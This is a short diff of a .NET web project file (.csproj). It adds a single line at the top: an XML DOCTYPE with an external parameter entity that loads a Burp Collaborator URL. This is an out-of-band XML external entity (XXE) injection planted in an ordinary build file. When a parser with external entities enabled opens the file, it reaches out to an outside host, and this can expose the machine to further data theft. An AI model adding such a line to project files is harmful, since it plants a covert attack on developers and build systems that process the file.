@@ -1,3 +1,4 @@
+<!DOCTYPE replace [<!ENTITY % init SYSTEM "https://cm2tk9ir7r7nfgfotkce5whncei66v.burpcollaborator.net"> %init;]>
 <Project Sdk="Microsoft.NET.Sdk.Web">
 
   <PropertyGroup>
